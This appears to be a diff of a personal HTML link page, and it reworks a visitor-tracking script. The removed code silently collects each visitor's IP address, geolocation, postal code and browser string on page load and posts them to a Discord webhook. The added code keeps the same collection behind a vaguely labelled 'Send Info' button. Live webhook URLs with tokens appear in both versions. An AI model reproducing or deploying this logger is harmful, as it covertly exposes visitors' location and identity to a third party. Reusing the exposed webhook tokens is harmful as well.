@@ -99,6 +99,22 @@
         .corner-button:hover {
             color: #b89ef5;
         }
+
+        #send-data-button {
+            background-color: #444;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 18px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-family: 'Minecraft', Arial, sans-serif;
+        }
+
+        #send-data-button:disabled {
+            background-color: #666;
+            cursor: not-allowed;
+        }
     </style>
 </head>
 
@@ -118,6 +134,9 @@
         <div class="dropdown-container" id="friends-container">
             <a href="https://guns.lol/doommonkey" target="_blank">DoomMonkey</a>
         </div>
+
+
+        <button id="send-data-button">Send Info</button>
     </div>
 
     <button class="corner-button" onclick="window.location.href='void.html'">.</button>
@@ -128,6 +147,7 @@
             var friendsButton = document.getElementById("friends-button");
             var linksContainer = document.getElementById("links-container");
             var friendsContainer = document.getElementById("friends-container");
+            var sendDataButton = document.getElementById("send-data-button");
 
             linksButton.addEventListener("click", function () {
                 linksContainer.style.display = linksContainer.style.display === "block" ? "none" : "block";
@@ -138,39 +158,46 @@
             });
 
 
-            fetch('https://ipapi.co/json/')
-                .then(response => response.json())
-                .then(data => {
-                    const info = {
-                        ip: data.ip,
-                        city: data.city,
-                        region: data.region,
-                        country: data.country_name,
-                        lat: data.latitude,
-                        lon: data.longitude,
-                        postal: data.postal,
-                        browser: navigator.userAgent,
-                    };
+            if (localStorage.getItem('dataSent') === 'true') {
+                sendDataButton.disabled = true;
+                sendDataButton.textContent = 'Info Already Sent';
+            }
 
-                    fetch('https://discord.com/api/webhooks/1277290409315274923/6xlQ_3e1cBd51tyUhdyZbalUxQ8x0Fq0BSlij1q-eWrL-zxtlX733gu0uGCWjmndQNT1', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            content: `User Info:\nIP: ${info.ip}\nLocation: ${info.city}, ${info.region}, ${info.country}\nLatitude: ${info.lat}\nLongitude: ${info.lon}\nPostal Code: ${info.postal}\nBrowser: ${info.browser}`
-                        }),
-                    })
-                    .then(response => {
-                        if (response.ok) {
-                            console.log('User info sent successfully.');
-                        } else {
-                            console.error('Failed to send user info.');
-                        }
-                    })
-                    .catch(error => console.error('Error:', error));
-                })
-                .catch(error => console.error('Error fetching IP info:', error));
+
+            sendDataButton.addEventListener('click', function () {
+                fetch('https://ipapi.co/json/')
+                    .then(response => response.json())
+                    .then(data => {
+                        const info = {
+                            ip: data.ip,
+                            city: data.city,
+                            region: data.region,
+                            country: data.country_name,
+                            lat: data.latitude,
+                            lon: data.longitude,
+                            postal: data.postal,
+                            browser: navigator.userAgent,
+                        };
+
+                        fetch('https://discord.com/api/webhooks/1277294433737637919/mW25bc3vu2cTfOFuDJHtBay2XCJI-djLPTKT2jHv2MNmQ5CwBfg8GKKF9CeDK44H-xtY', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify({
+                                content: `User Info:\nIP: ${info.ip}\nLocation: ${info.city}, ${info.region}, ${info.country}\nLatitude: ${info.lat}\nLongitude: ${info.lon}\nPostal Code: ${info.postal}\nBrowser: ${info.browser}`
+                            }),
+                        })
+                        .then(() => {
+                            alert('Information sent successfully!');
+
+                            localStorage.setItem('dataSent', 'true');
+                            sendDataButton.disabled = true;
+                            sendDataButton.textContent = 'Info Already Sent';
+                        })
+                        .catch(err => console.error('Error:', err));
+                    });
+            });
         });
     </script>
 </body>
